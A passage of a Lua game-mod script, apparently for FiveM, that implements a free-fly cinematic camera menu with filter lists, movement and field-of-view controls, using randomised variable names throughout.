            "int_office_LobbyHall",
            "int_tattoo",
            "int_tattoo_B",
            "int_tunnel_none_dark",
            "interior_WATER_lighting",
            "introblue",
            "jewel_gas",
            "jewel_optim",
            "jewelry_entrance",
            "jewelry_entrance_INT",
            "jewelry_entrance_INT_fog",
            "lab_none",
            "lab_none_dark",
            "lab_none_dark_OVR",
            "lab_none_dark_fog",
            "lab_none_exit",
            "lab_none_exit_OVR",
            "li",
            "lightning",
            "lightning_cloud",
            "lightning_strong",
            "lightning_weak",
            "lightpolution",
            "lodscaler",
            "maxlodscaler",
            "metro",
            "micheal",
            "micheals_lightsOFF",
            "michealspliff",
            "michealspliff_blend",
            "michealspliff_blend02",
            "militarybase_nightlight",
            "mineshaft",
            "morebloom",
            "morgue_dark",
            "morgue_dark_ovr",
            "mp_battle_int01",
            "mp_battle_int01_dancefloor",
            "mp_battle_int01_dancefloor_OFF",
            "mp_battle_int01_entry",
            "mp_battle_int01_garage",
            "mp_battle_int01_office",
            "mp_battle_int02",
            "mp_battle_int03",
            "mp_battle_int03_tint1",
            "mp_battle_int03_tint2",
            "mp_battle_int03_tint3",
            "mp_battle_int03_tint4",
            "mp_battle_int03_tint5",
            "mp_battle_int03_tint6",
            "mp_battle_int03_tint7",
            "mp_battle_int03_tint8",
            "mp_battle_int03_tint9",
            "mp_bkr_int01_garage",
            "mp_bkr_int01_small_rooms",
            "mp_bkr_int01_transition",
            "mp_bkr_int02_garage",
            "mp_bkr_int02_hangout",
            "mp_bkr_int02_small_rooms",
            "mp_bkr_ware01",
            "mp_bkr_ware02_dry",
            "mp_bkr_ware02_standard",
            "mp_bkr_ware02_upgrade",
            "mp_bkr_ware03_basic",
            "mp_bkr_ware03_upgrade",
            "mp_bkr_ware04",
            "mp_bkr_ware05",
            "mp_exec_office_01",
            "mp_exec_office_02",
            "mp_exec_office_03",
            "mp_exec_office_03C",
            "mp_exec_office_03_blue",
            "mp_exec_office_04",
            "mp_exec_office_05",
            "mp_exec_office_06",
            "mp_exec_warehouse_01",
            "mp_gr_int01_black",
            "mp_gr_int01_grey",
            "mp_gr_int01_white",
            "mp_h_05",
            "mp_h_07",
            "mp_h_08",
            "mp_imx_intwaremed",
            "mp_imx_intwaremed_office",
            "mp_imx_mod_int_01",
            "mp_lad_day",
            "mp_lad_judgment",
            "mp_lad_night",
            "mp_nightshark_shield_fp",
            "mp_smg_int01_han",
            "mp_smg_int01_han_blue",
            "mp_smg_int01_han_red",
            "mp_smg_int01_han_yellow",
            "mp_x17dlc_base",
            "mp_x17dlc_base_dark",
            "mp_x17dlc_base_darkest",
            "mp_x17dlc_facility",
            "mp_x17dlc_facility2",
            "mp_x17dlc_facility_conference",
            "mp_x17dlc_in_sub",
            "mp_x17dlc_in_sub_no_reflection",
            "mp_x17dlc_int_01",
            "mp_x17dlc_int_01_tint1",
            "mp_x17dlc_int_01_tint2",
            "mp_x17dlc_int_01_tint3",
            "mp_x17dlc_int_01_tint4",
            "mp_x17dlc_int_01_tint5",
            "mp_x17dlc_int_01_tint6",
            "mp_x17dlc_int_01_tint7",
            "mp_x17dlc_int_01_tint8",
            "mp_x17dlc_int_01_tint9",
            "mp_x17dlc_int_02",
            "mp_x17dlc_int_02_hangar",
            "mp_x17dlc_int_02_outdoor_intro_camera",
            "mp_x17dlc_int_02_tint1",
            "mp_x17dlc_int_02_tint2",
            "mp_x17dlc_int_02_tint3",
            "mp_x17dlc_int_02_tint4",
            "mp_x17dlc_int_02_tint5",
            "mp_x17dlc_int_02_tint6",
            "mp_x17dlc_int_02_tint7",
            "mp_x17dlc_int_02_tint8",
            "mp_x17dlc_int_02_tint9",
            "mp_x17dlc_int_02_vehicle_avenger_camera",
            "mp_x17dlc_int_02_vehicle_workshop_camera",
            "mp_x17dlc_int_02_weapon_avenger_camera",
            "mp_x17dlc_int_silo",
            "mp_x17dlc_int_silo_escape",
            "mp_x17dlc_lab",
            "mp_x17dlc_lab_loading_bay",
            "mugShot",
            "mugShot_lineup",
            "multiplayer_ped_fight",
            "nervousRON_fog",
            "new_MP_Garage_L",
            "new_bank",
            "new_stripper_changing",
            "new_tunnels_entrance",
            "nextgen",
            "nightvision",
            "overwater",
            "paleto_nightlight",
            "paleto_opt",
            "phone_cam",
            "phone_cam1",
            "phone_cam10",
            "phone_cam11",
            "phone_cam12",
            "phone_cam13",
            "phone_cam2",
            "phone_cam3",
            "phone_cam3_REMOVED",
            "phone_cam4",
            "phone_cam5",
            "phone_cam6",
            "phone_cam7",
            "phone_cam8",
            "phone_cam8_REMOVED",
            "phone_cam9",
            "plane_inside_mode",
            "player_transition",
            "player_transition_no_scanlines",
            "player_transition_scanlines",
            "plaza_carpark",
            "polluted",
            "poolsidewaterreflection2",
            "powerplant_nightlight",
            "powerstation",
            "prison_nightlight",
            "projector",
            "prologue",
            "prologue_ending_fog",
            "prologue_ext_art_amb",
            "prologue_reflection_opt",
            "prologue_shootout",
            "pulse",
            "ranch",
            "reducelightingcost",
            "reducewaterREF",
            "refit",
            "reflection_correct_ambient",
            "resvoire_reflection",
            "rply_brightness",
            "rply_brightness_neg",
            "rply_contrast",
            "rply_contrast_neg",
            "rply_motionblur",
            "rply_saturation",
            "rply_saturation_neg",
            "rply_vignette",
            "rply_vignette_neg",
            "sandyshore_nightlight",
            "scanline_cam",
            "scanline_cam_cheap",
            "scope_zoom_in",
            "scope_zoom_out",
            "secret_camera",
            "services_nightlight",
            "shades_pink",
            "shades_yellow",
            "ship_explosion_underwater",
            "ship_lighting",
            "sleeping",
            "spectator1",
            "spectator10",
            "spectator2",
            "spectator3",
            "spectator4",
            "spectator5",
            "spectator6",
            "spectator7",
            "spectator8",
            "spectator9",
            "stc_coroners",
            "stc_deviant_bedroom",
            "stc_deviant_lounge",
            "stc_franklinsHouse",
            "stc_trevors",
            "stoned",
            "stoned_aliens",
            "stoned_cutscene",
            "stoned_monkeys",
            "subBASE_water_ref",
            "sunglasses",
            "superDARK",
            "switch_cam_1",
            "switch_cam_2",
            "telescope",
            "torpedo",
            "traffic_skycam",
            "trailer_explosion_optimise",
            "trevorspliff",
            "trevorspliff_blend",
            "trevorspliff_blend02",
            "tunnel_entrance",
            "tunnel_entrance_INT",
            "tunnel_id1_11",
            "ufo",
            "ufo_deathray",
            "underwater",
            "underwater_deep",
            "underwater_deep_clear",
            "v_abattoir",
            "v_bahama",
            "v_cashdepot",
            "v_dark",
            "v_foundry",
            "v_janitor",
            "v_jewel2",
            "v_metro",
            "v_michael",
            "v_michael_lounge",
            "v_recycle",
            "v_rockclub",
            "v_strip3",
            "v_strpchangerm",
            "v_sweat",
            "v_sweat_NoDirLight",
            "v_sweat_entrance",
            "v_torture",
            "vagos_extlight_small",
            "vehicle_subint",
            "venice_canal_tunnel",
            "vespucci_garage",
            "warehouse",
            "whitenightlighting",
            "winning_room",
            "yacht_DLC",
            "yell_tunnel_nodirect"
        }
        local MId7ylF56Gng4srxPxe = nil
        local uLy_yMvZtZN = 0.0
        local EtlskCwKkJozvZOMk3TE = 0.0
        local EzfCS = 0.0
        local rBAumogi01Hhc3o = {}
        rBAumogi01Hhc3o.x = 0.0
        rBAumogi01Hhc3o.y = 0.0
        rBAumogi01Hhc3o.z = 0.0
        local Hs5u8DGA3_ITJr = 0
        local LoR2CzSu0z = 1.0
        local amthbSPmHi7re52
        local di6K369u = {}
        for i = Cfg.minPrecision, Cfg.maxPrecision + 0.01, Cfg.incrPrecision do
            table.insert(di6K369u, tostring(i))
            Hs5u8DGA3_ITJr = Hs5u8DGA3_ITJr + 1
            if (tostring(i) == "1.0") then
                amthbSPmHi7re52 = Hs5u8DGA3_ITJr
            end
        end
        local h9el = 1.0
        local a3R841Sms8A9 = 1
        local Fb = 10
        local zleQSNJa2MIXT = {}
        for i = 0.1, 2.01, 0.1 do
            table.insert(zleQSNJa2MIXT, tostring(i))
        end
        local RC6324gatFukuiW30Q = false
        local LmL2iu0_0 = false
        local Lb8cPEqkMxi0cs_Amf_ = false
        local LJP0IIkAqCHm8DD
        local B6xbIwmy
        local F = false
        local BLUavHwuTXfZ0kv0ugQt = NativeUI.CreatePool()
        local qc0gHAB7
        local UEpg8NV7t9sP6oIl_LM
        local h9M40bqWBrMNGDbG
        local cU1A8qp
        local fiV
        local SM7lM3dm2_
        local Ca8Ht = nil
        if ((Cfg.useNativeUI and Cfg.useNativeUIReloaded) or (not Cfg.useNativeUI and not Cfg.useNativeUIReloaded)) then
            print(Cfg.strings.wrongUIError)
        end
        Citizen.CreateThread(
            function()
                local Sy_9A = 0
                qc0gHAB7 = NativeUI.CreateMenu(Cfg.strings.menuTitle, Cfg.strings.menuSubtitle)
                BLUavHwuTXfZ0kv0ugQt:Add(qc0gHAB7)
                while true do
                    Citizen.Wait(1)
                    if (BLUavHwuTXfZ0kv0ugQt:IsAnyMenuOpen()) then
                        BLUavHwuTXfZ0kv0ugQt:ProcessMenus()
                    end
                    if (Cfg.useButton) then
                        if (IsDisabledControlPressed(1, Cfg.controls.controller.openMenu)) then
                            Sy_9A = Sy_9A + 1
                        elseif (IsDisabledControlJustReleased(1, Cfg.controls.controller.openMenu)) then
                            Sy_9A = 0
                        end
                        if (IsDisabledControlJustReleased(1, Cfg.controls.keyboard.openMenu) or Sy_9A >= 60) then
                            if (Sy_9A >= 60) then
                                Sy_9A = 0
                            end
                            if (qc0gHAB7:Visible()) then
                                qc0gHAB7:Visible(false)
                            else
                                GenerateCamMenu()
                                qc0gHAB7:Visible(true)
                            end
                        end
                    end
                    if (MId7ylF56Gng4srxPxe) then
                        ProcessCamControls()
                    end
                end
            end
        )
        Citizen.CreateThread(
            function()
                if (Cfg.usePermissions) then
                    while (Ca8Ht == nil) do
                        Citizen.Wait(1000)
                    end
                    if (Ca8Ht == false) then
                        return
                    end
                end
                while true do
                    Citizen.Wait(500)
                    if (qc0gHAB7:Visible() and MId7ylF56Gng4srxPxe) then
                        local Qlm = GetEntityInFrontOfCam()
                        local kcd4ZJmZtD = "-"
                        if (DoesEntityExist(Qlm)) then
                            kcd4ZJmZtD = tostring(GetEntityModel(Qlm))
                            if (IsEntityAVehicle(Qlm)) then
                                kcd4ZJmZtD = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(Qlm)))
                            end
                        end
                        fiV:RightLabel(kcd4ZJmZtD)
                        if (Lb8cPEqkMxi0cs_Amf_ and not DoesEntityExist(LJP0IIkAqCHm8DD)) then
                            Lb8cPEqkMxi0cs_Amf_ = false
                            ClearFocus()
                            StopCamPointing(MId7ylF56Gng4srxPxe)
                        end
                    end
                end
            end
        )
        function GenerateCamMenu()
            BLUavHwuTXfZ0kv0ugQt:Remove()
            BLUavHwuTXfZ0kv0ugQt = NativeUI.CreatePool()
            collectgarbage()
            qc0gHAB7 = NativeUI.CreateMenu(Cfg.strings.menuTitle, Cfg.strings.menuSubtitle)
            BLUavHwuTXfZ0kv0ugQt:Add(qc0gHAB7)
            local NzHYBuJmX7EBi8 =
                NativeUI.CreateRectangle(
                nil,
                nil,
                nil,
                nil,
                hcmnFj7ddqmbgXI5lN[1],
                hcmnFj7ddqmbgXI5lN[2],
                hcmnFj7ddqmbgXI5lN[3],
                255
            )
            qc0gHAB7:SetBannerRectangle(NzHYBuJmX7EBi8, true)
            local CFOqww8OfaUuesN5otDc =
                NativeUI.CreateCheckboxItem(
                Cfg.strings.toggleCam,
                DoesCamExist(MId7ylF56Gng4srxPxe),
                Cfg.strings.toggleCamDesc
            )
            qc0gHAB7:AddItem(CFOqww8OfaUuesN5otDc)
            UEpg8NV7t9sP6oIl_LM =
                NativeUI.CreateListItem(Cfg.strings.precision, di6K369u, amthbSPmHi7re52, Cfg.strings.precisionDesc)
            qc0gHAB7:AddItem(UEpg8NV7t9sP6oIl_LM)
            local B24digK_6OF = BLUavHwuTXfZ0kv0ugQt:AddSubMenu(qc0gHAB7, Cfg.strings.filter, Cfg.strings.filterDesc)
            qc0gHAB7.Items[#qc0gHAB7.Items]:SetLeftBadge(15)
            h9M40bqWBrMNGDbG =
                NativeUI.CreateListItem(Cfg.strings.filter, Cfg.filterList, a3R841Sms8A9, Cfg.strings.filterDesc)
            if (Cfg.useNativeUIReloaded) then
                B24digK_6OF.SubMenu:AddItem(h9M40bqWBrMNGDbG)
            elseif (Cfg.useNativeUI) then
                B24digK_6OF:AddItem(h9M40bqWBrMNGDbG)
            end
            cU1A8qp = NativeUI.CreateListItem(Cfg.strings.filterInten, zleQSNJa2MIXT, Fb, Cfg.strings.filterIntenDesc)
            if (Cfg.useNativeUIReloaded) then
                B24digK_6OF.SubMenu:AddItem(cU1A8qp)
            elseif (Cfg.useNativeUI) then
                B24digK_6OF:AddItem(cU1A8qp)
            end
            local vsTDbCnSdAdRTi = NativeUI.CreateItem(Cfg.strings.delFilter, Cfg.strings.delFilterDesc)
            if (Cfg.useNativeUIReloaded) then
                B24digK_6OF.SubMenu:AddItem(vsTDbCnSdAdRTi)
            elseif (Cfg.useNativeUI) then
                B24digK_6OF:AddItem(vsTDbCnSdAdRTi)
            end
            local EX7u_GK4Wld4QbNjx =
                NativeUI.CreateCheckboxItem(Cfg.strings.freeFly, RC6324gatFukuiW30Q, Cfg.strings.freeFlyDesc)
            qc0gHAB7:AddItem(EX7u_GK4Wld4QbNjx)
            fiV = NativeUI.CreateItem(Cfg.strings.attachCam, Cfg.strings.attachCamDesc)
            qc0gHAB7:AddItem(fiV)
            local fhFx1FPXOPg =
                NativeUI.CreateCheckboxItem(Cfg.strings.charControl, LmL2iu0_0, Cfg.strings.charControlDesc)
            qc0gHAB7:AddItem(fhFx1FPXOPg)
            CFOqww8OfaUuesN5otDc.CheckboxEvent = function(ioz0xuyOJ3D_Sci, JFcnNQ, sKGF4fJodF)
                ToggleCam(sKGF4fJodF, GetGameplayCamFov())
            end
            UEpg8NV7t9sP6oIl_LM.OnListChanged = function(jQXd6736HCXk, XbUYuYYaH7U3FMFCf3CZ, q_6uctQbKIn)
                ChangePrecision(q_6uctQbKIn)
            end
            EX7u_GK4Wld4QbNjx.CheckboxEvent = function(UdsqwdvpzyBnT, IGTi1JSso60wPyL4Kd1n, DZMHEQua_qTwAa)
                ToggleFreeFlyMode(DZMHEQua_qTwAa)
            end
            qc0gHAB7.OnItemSelect = function(abA3AVHRYykqjqSz, Dl3kezjaOD7ZMDGVPN8N, OE0MyR4BvU8cAjj)
                if (Dl3kezjaOD7ZMDGVPN8N == fiV) then
                    ToggleAttachMode()
                end
            end
            fhFx1FPXOPg.CheckboxEvent = function(jd8SGjK, WT3PbBO1Ue2p, Hts)
                ToggleCharacterControl(Hts)
            end
            h9M40bqWBrMNGDbG.OnListChanged = function(XNW9C6, gaCm, KAIGFLr)
                ApplyFilter(KAIGFLr)
            end
            cU1A8qp.OnListChanged = function(usn, NVnQxJ7oTPLICjLrxNDx, ppPq)
                ChangeFilterIntensity(ppPq)
            end
            if (Cfg.useNativeUIReloaded) then
                B24digK_6OF.SubMenu.OnItemSelect = function(nLaGQXURGN9, A1xicpV2f_tKVYgR, myv)
                    if (A1xicpV2f_tKVYgR == vsTDbCnSdAdRTi) then
                        ResetFilter()
                    end
                end
            elseif (Cfg.useNativeUI) then
                B24digK_6OF.OnItemSelect = function(udRCbNnM1RyacKGylyPj, y5zD96Vw2n5, rQp)
                    if (y5zD96Vw2n5 == vsTDbCnSdAdRTi) then
                        ResetFilter()
                    end
                end
            end
            BLUavHwuTXfZ0kv0ugQt:ControlDisablingEnabled(false)
            BLUavHwuTXfZ0kv0ugQt:MouseControlsEnabled(false)
            BLUavHwuTXfZ0kv0ugQt:RefreshIndex()
        end
        function StartFreeCam(bWJ1vEuwqZiCioRK)
            ClearFocus()
            local qaFuMYA = PlayerPedId()
            MId7ylF56Gng4srxPxe =
                CreateCamWithParams(
                "DEFAULT_SCRIPTED_CAMERA",
                GetEntityCoords(qaFuMYA),
                0,
                0,
                0,
                bWJ1vEuwqZiCioRK * 1.0
            )
            SetCamActive(MId7ylF56Gng4srxPxe, true)
            RenderScriptCams(true, false, 0, true, false)
            SetCamAffectsAiming(MId7ylF56Gng4srxPxe, false)
            if (Lb8cPEqkMxi0cs_Amf_ and DoesEntityExist(LJP0IIkAqCHm8DD)) then
                rBAumogi01Hhc3o = GetOffsetFromEntityGivenWorldCoords(LJP0IIkAqCHm8DD, GetCamCoord(MId7ylF56Gng4srxPxe))
                AttachCamToEntity(
                    MId7ylF56Gng4srxPxe,
                    LJP0IIkAqCHm8DD,
                    rBAumogi01Hhc3o.x,
                    rBAumogi01Hhc3o.y,
                    rBAumogi01Hhc3o.z,
                    true
                )
            end
        end
        function EndFreeCam()
            ClearFocus()
            RenderScriptCams(false, false, 0, true, false)
            DestroyCam(MId7ylF56Gng4srxPxe, false)
            uLy_yMvZtZN = 0.0
            EtlskCwKkJozvZOMk3TE = 0.0
            EzfCS = 0.0
            Lb8cPEqkMxi0cs_Amf_ = false
            h9el = 1.0
            LoR2CzSu0z = 1.0
            currFov = GetGameplayCamFov()
            MId7ylF56Gng4srxPxe = nil
        end
        function ProcessCamControls()
            local rVy = PlayerPedId()
            DisableFirstPersonCamThisFrame()
            BlockWeaponWheelThisFrame()
            if (not LmL2iu0_0) then
                for ZvfaGhPYSL, z3nLKaXP6Bpu in pairs(Cfg.disabledControls) do
                    DisableControlAction(0, z3nLKaXP6Bpu, true)
                end
            end
            if (Lb8cPEqkMxi0cs_Amf_) then
                rBAumogi01Hhc3o = ProcessNewPosition(rBAumogi01Hhc3o.x, rBAumogi01Hhc3o.y, rBAumogi01Hhc3o.z)
                SetFocusEntity(LJP0IIkAqCHm8DD)
                AttachCamToEntity(
                    MId7ylF56Gng4srxPxe,
                    LJP0IIkAqCHm8DD,
                    rBAumogi01Hhc3o.x,
                    rBAumogi01Hhc3o.y,
                    rBAumogi01Hhc3o.z,
                    true
                )
                if (Vdist(0.0, 0.0, 0.0, rBAumogi01Hhc3o.x, rBAumogi01Hhc3o.y, rBAumogi01Hhc3o.z) > Cfg.maxDistance) then
                    AttachCamToEntity(
                        MId7ylF56Gng4srxPxe,
                        LJP0IIkAqCHm8DD,
                        rBAumogi01Hhc3o.x,
                        rBAumogi01Hhc3o.y,
                        rBAumogi01Hhc3o.z,
                        true
                    )
                end
                local J8PZ5_C_Zthp3F = GetEntityRotation(LJP0IIkAqCHm8DD, 2)
                SetCamRot(
                    MId7ylF56Gng4srxPxe,
                    J8PZ5_C_Zthp3F.x + uLy_yMvZtZN,
                    J8PZ5_C_Zthp3F.y + EtlskCwKkJozvZOMk3TE,
                    J8PZ5_C_Zthp3F.z + EzfCS,
                    2
                )
            else
                local s2i = GetCamCoord(MId7ylF56Gng4srxPxe)
                local hYIDbnPK2SympXF = ProcessNewPosition(s2i.x, s2i.y, s2i.z)
                SetFocusArea(hYIDbnPK2SympXF.x, hYIDbnPK2SympXF.y, hYIDbnPK2SympXF.z, 0.0, 0.0, 0.0)
                SetCamCoord(MId7ylF56Gng4srxPxe, hYIDbnPK2SympXF.x, hYIDbnPK2SympXF.y, hYIDbnPK2SympXF.z)
                SetCamRot(MId7ylF56Gng4srxPxe, uLy_yMvZtZN, EtlskCwKkJozvZOMk3TE, EzfCS, 2)
            end
        end
        function ProcessNewPosition(WKO0OQgZDo, lUiO, iYJTHodyEbk)
            local RgeDWq7jWuk4D = WKO0OQgZDo
            local d_yOwmqY1G9Pw = lUiO
            local VH1i6Vd1si3hMVTwcD = iYJTHodyEbk
            if (IsInputDisabled(0) and not LmL2iu0_0) then
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.forwards)) then
                    local Z2FOBNXwGtMBeX = Sin(EzfCS)
                    local kzFx = Cos(EzfCS)
                    local Km4wvNiHacqN18bBAURy8 = Sin(uLy_yMvZtZN)
                    RgeDWq7jWuk4D = RgeDWq7jWuk4D - (0.1 * h9el * Z2FOBNXwGtMBeX)
                    d_yOwmqY1G9Pw = d_yOwmqY1G9Pw + (0.1 * h9el * kzFx)
                    if (RC6324gatFukuiW30Q) then
                        VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD + (0.1 * h9el * Km4wvNiHacqN18bBAURy8)
                    end
                end
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.backwards)) then
                    local V1bAKNeJkGKBc = Sin(EzfCS)
                    local EA = Cos(EzfCS)
                    local iJzY51fes11lMpl = Sin(uLy_yMvZtZN)
                    RgeDWq7jWuk4D = RgeDWq7jWuk4D + (0.1 * h9el * V1bAKNeJkGKBc)
                    d_yOwmqY1G9Pw = d_yOwmqY1G9Pw - (0.1 * h9el * EA)
                    if (RC6324gatFukuiW30Q) then
                        VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD - (0.1 * h9el * iJzY51fes11lMpl)
                    end
                end
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.left)) then
                    local rVxAD_RJhC0eQv = Sin(EzfCS + 90.0)
                    local ILy_6UNQKWmjFqe6 = Cos(EzfCS + 90.0)
                    local o7RpHGzjAtQZpr1tuu8 = Sin(EtlskCwKkJozvZOMk3TE)
                    RgeDWq7jWuk4D = RgeDWq7jWuk4D - (0.1 * h9el * rVxAD_RJhC0eQv)
                    d_yOwmqY1G9Pw = d_yOwmqY1G9Pw + (0.1 * h9el * ILy_6UNQKWmjFqe6)
                    if (RC6324gatFukuiW30Q) then
                        VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD + (0.1 * h9el * o7RpHGzjAtQZpr1tuu8)
                    end
                end
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.right)) then
                    local it = Sin(EzfCS + 90.0)
                    local DzZEXzBjvDTbaELiW4vV = Cos(EzfCS + 90.0)
                    local lW9QYHp9cwdioZMLqK = Sin(EtlskCwKkJozvZOMk3TE)
                    RgeDWq7jWuk4D = RgeDWq7jWuk4D + (0.1 * h9el * it)
                    d_yOwmqY1G9Pw = d_yOwmqY1G9Pw - (0.1 * h9el * DzZEXzBjvDTbaELiW4vV)
                    if (RC6324gatFukuiW30Q) then
                        VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD - (0.1 * h9el * lW9QYHp9cwdioZMLqK)
                    end
                end
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.up)) then
                    VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD + (0.1 * h9el)
                end
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.down)) then
                    VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD - (0.1 * h9el)
                end
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.hold)) then
                    if (IsDisabledControlPressed(1, Cfg.controls.keyboard.speedUp)) then
                        if ((h9el + 0.1) < Cfg.maxSpeed) then
                            h9el = h9el + 0.1
                        else
                            h9el = Cfg.maxSpeed
                        end
                    elseif (IsDisabledControlPressed(1, Cfg.controls.keyboard.speedDown)) then
                        if ((h9el - 0.1) > Cfg.minSpeed) then
                            h9el = h9el - 0.1
                        else
                            h9el = Cfg.minSpeed
                        end
                    end
                else
                    if (IsDisabledControlPressed(1, Cfg.controls.keyboard.zoomOut)) then
                        ChangeFov(1.0)
                    elseif (IsDisabledControlPressed(1, Cfg.controls.keyboard.zoomIn)) then
                        ChangeFov(-1.0)
                    end
                end
                uLy_yMvZtZN = uLy_yMvZtZN - (GetDisabledControlNormal(1, 2) * LoR2CzSu0z * 8.0)
                EzfCS = EzfCS - (GetDisabledControlNormal(1, 1) * LoR2CzSu0z * 8.0)
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.rollLeft)) then
                    EtlskCwKkJozvZOMk3TE = EtlskCwKkJozvZOMk3TE - LoR2CzSu0z
                end
                if (IsDisabledControlPressed(1, Cfg.controls.keyboard.rollRight)) then
                    EtlskCwKkJozvZOMk3TE = EtlskCwKkJozvZOMk3TE + LoR2CzSu0z
                end
            elseif (not LmL2iu0_0) then
                local zuWH3E8 = Sin(EzfCS)
                local vKYfW2oMWD = Cos(EzfCS)
                local XxYm1_hpfirrPKJ4eB = Sin(uLy_yMvZtZN)
                RgeDWq7jWuk4D = RgeDWq7jWuk4D - (0.1 * h9el * zuWH3E8 * GetDisabledControlNormal(1, 32))
                d_yOwmqY1G9Pw = d_yOwmqY1G9Pw + (0.1 * h9el * vKYfW2oMWD * GetDisabledControlNormal(1, 32))
                if (RC6324gatFukuiW30Q) then
                    VH1i6Vd1si3hMVTwcD =
                        VH1i6Vd1si3hMVTwcD + (0.1 * h9el * XxYm1_hpfirrPKJ4eB * GetDisabledControlNormal(1, 32))
                end
                RgeDWq7jWuk4D = RgeDWq7jWuk4D + (0.1 * h9el * zuWH3E8 * GetDisabledControlNormal(1, 33))
                d_yOwmqY1G9Pw = d_yOwmqY1G9Pw - (0.1 * h9el * vKYfW2oMWD * GetDisabledControlNormal(1, 33))
                if (RC6324gatFukuiW30Q) then
                    VH1i6Vd1si3hMVTwcD =
                        VH1i6Vd1si3hMVTwcD - (0.1 * h9el * XxYm1_hpfirrPKJ4eB * GetDisabledControlNormal(1, 33))
                end
                zuWH3E8 = Sin(EzfCS + 90.0)
                vKYfW2oMWD = Cos(EzfCS + 90.0)
                local tyVAUDxkrI = Sin(EtlskCwKkJozvZOMk3TE)
                RgeDWq7jWuk4D = RgeDWq7jWuk4D - (0.1 * h9el * zuWH3E8 * GetDisabledControlNormal(1, 34))
                d_yOwmqY1G9Pw = d_yOwmqY1G9Pw + (0.1 * h9el * vKYfW2oMWD * GetDisabledControlNormal(1, 34))
                if (RC6324gatFukuiW30Q) then
                    VH1i6Vd1si3hMVTwcD =
                        VH1i6Vd1si3hMVTwcD + (0.1 * h9el * tyVAUDxkrI * GetDisabledControlNormal(1, 34))
                end
                RgeDWq7jWuk4D = RgeDWq7jWuk4D + (0.1 * h9el * zuWH3E8 * GetDisabledControlNormal(1, 35))
                d_yOwmqY1G9Pw = d_yOwmqY1G9Pw - (0.1 * h9el * vKYfW2oMWD * GetDisabledControlNormal(1, 35))
                if (RC6324gatFukuiW30Q) then
                    VH1i6Vd1si3hMVTwcD =
                        VH1i6Vd1si3hMVTwcD - (0.1 * h9el * tyVAUDxkrI * GetDisabledControlNormal(1, 35))
                end
                if (GetDisabledControlNormal(1, 228) ~= 0.0) then
                    if (IsDisabledControlPressed(1, Cfg.controls.controller.holdFov)) then
                        ChangeFov(GetDisabledControlNormal(1, 228))
                    elseif (IsDisabledControlPressed(1, Cfg.controls.controller.holdSpeed)) then
                        local hMox_teWpg = h9el - (0.1 * GetDisabledControlNormal(1, 228))
                        if (hMox_teWpg > Cfg.minSpeed) then
                            h9el = hMox_teWpg
                        else
                            h9el = Cfg.minSpeed
                        end
                    else
                        VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD - (0.1 * h9el * GetDisabledControlNormal(1, 228))
                    end
                end
                if (GetDisabledControlNormal(1, 229) ~= 0.0) then
                    if (IsDisabledControlPressed(1, Cfg.controls.controller.holdFov)) then
                        ChangeFov(-GetDisabledControlNormal(1, 229))
                    elseif (IsDisabledControlPressed(1, Cfg.controls.controller.holdSpeed)) then
                        local XbtEIFlQi5K = h9el + (0.1 * GetDisabledControlNormal(1, 229))
                        if (XbtEIFlQi5K < Cfg.maxSpeed) then
                            h9el = XbtEIFlQi5K
                        else
                            h9el = Cfg.maxSpeed
                        end
                    else
                        VH1i6Vd1si3hMVTwcD = VH1i6Vd1si3hMVTwcD + (0.1 * h9el * GetDisabledControlNormal(1, 229))
                    end
                end
                uLy_yMvZtZN = uLy_yMvZtZN - (GetDisabledControlNormal(1, 2) * LoR2CzSu0z)
                EzfCS = EzfCS - (GetDisabledControlNormal(1, 1) * LoR2CzSu0z)
                if (IsDisabledControlPressed(1, Cfg.controls.controller.rollLeft)) then
                    EtlskCwKkJozvZOMk3TE = EtlskCwKkJozvZOMk3TE - LoR2CzSu0z
                end
                if (IsDisabledControlPressed(1, Cfg.controls.controller.rollRight)) then
                    EtlskCwKkJozvZOMk3TE = EtlskCwKkJozvZOMk3TE + LoR2CzSu0z
                end
            end
            if (uLy_yMvZtZN > 90.0) then
                uLy_yMvZtZN = 90.0
            elseif (uLy_yMvZtZN < -90.0) then
                uLy_yMvZtZN = -90.0
            end
            if (EtlskCwKkJozvZOMk3TE > 90.0) then
                EtlskCwKkJozvZOMk3TE = 90.0
            elseif (EtlskCwKkJozvZOMk3TE < -90.0) then
                EtlskCwKkJozvZOMk3TE = -90.0
            end
            if (EzfCS > 360.0) then
                EzfCS = EzfCS - 360.0
            elseif (EzfCS < -360.0) then
                EzfCS = EzfCS + 360.0
            end
            return {x = RgeDWq7jWuk4D, y = d_yOwmqY1G9Pw, z = VH1i6Vd1si3hMVTwcD}
        end
        function ToggleCam(Q_J3K4tZ4_lD_zlZ, x22sSAK)
            if (Q_J3K4tZ4_lD_zlZ) then
                StartFreeCam(x22sSAK)
                BLUavHwuTXfZ0kv0ugQt:RefreshIndex()
            else
                EndFreeCam()
                BLUavHwuTXfZ0kv0ugQt:RefreshIndex()
            end
        end
        function ChangeFov(xaFaSDBY8bZA)
            if (DoesCamExist(MId7ylF56Gng4srxPxe)) then
                local qKnx743CiNsK = GetCamFov(MId7ylF56Gng4srxPxe)
                local ZkBhvT6aEZrLfthfa5U7y = qKnx743CiNsK + xaFaSDBY8bZA
                if ((ZkBhvT6aEZrLfthfa5U7y >= Cfg.minFov) and (ZkBhvT6aEZrLfthfa5U7y <= Cfg.maxFov)) then
                    SetCamFov(MId7ylF56Gng4srxPxe, ZkBhvT6aEZrLfthfa5U7y)
                end
            end
        end
        function ChangePrecision(FKmFE1JFQCv)
            LoR2CzSu0z = UEpg8NV7t9sP6oIl_LM.Items[FKmFE1JFQCv]
            amthbSPmHi7re52 = FKmFE1JFQCv
        end
